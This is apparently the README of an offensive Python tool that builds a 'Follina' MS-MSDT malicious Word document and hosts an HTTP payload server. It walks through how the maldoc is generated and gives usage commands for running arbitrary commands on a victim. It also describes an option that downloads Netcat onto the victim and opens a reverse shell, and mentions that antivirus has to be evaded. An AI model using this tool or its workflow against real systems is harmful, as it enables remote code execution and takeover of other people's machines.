# MS-MSDT "Follina" Attack Vector

--------------


This Python script generates a maldoc, that executes a PowerShell command on the target machine. It also sets up an HTTP server to deliver the malicious payload to the target machine.

The script takes several arguments, including the command to be executed on the target machine, the name and location of the output maldoc file, the network interface or IP address to host the HTTP server, the port to serve the HTTP server, and the port to serve the reverse shell on.

The script first parses the supplied interface to determine what to reach out to. It then copies a Microsoft Word skeleton into a temporary staging folder, prepares a temporary HTTP server location, and modifies the Word skeleton to include the HTTP server. The script then rebuilds the original office file and creates the maldoc.

Next, the script encodes the PowerShell command as base64 and creates a unique MS-MSDT payload that is over 4096 bytes at minimum. It then creates an HTML endpoint and hosts the HTTP server on all interfaces.

If the user has specified a reverse shell, the script downloads and executes a Netcat binary to establish a reverse shell on the target machine. The script creates a new thread to host the HTTP server and starts it. The anti-virus on the target system can flag the Netcat binary being downloaded so be careful.



--------------

Create a "Follina" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.

![Screenshot](https://user-images.githubusercontent.com/6288722/171033876-dbe73e3e-0a3a-436a-91d8-7fa77a5c1ace.png)

# Usage

```
usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]

options:
  -h, --help            show this help message and exit
  --command COMMAND, -c COMMAND
                        command to run on the target (default: calc)
  --output OUTPUT, -o OUTPUT
                        output maldoc file (default: ./follina.doc)
  --interface INTERFACE, -i INTERFACE
                        network interface or IP address to host the HTTP server (default: eth0)
  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
```

# Examples

Pop `calc.exe`:

```
$ python3 follina.py   
[+] copied staging doc /tmp/9mcvbrwo
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
```

Pop `notepad.exe`:

```
$ python3 follina.py -c "notepad"
```

Get a reverse shell on port 9001. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**

```
$ python3 follina.py -r 9001
```

![Reverse Shell](https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png)
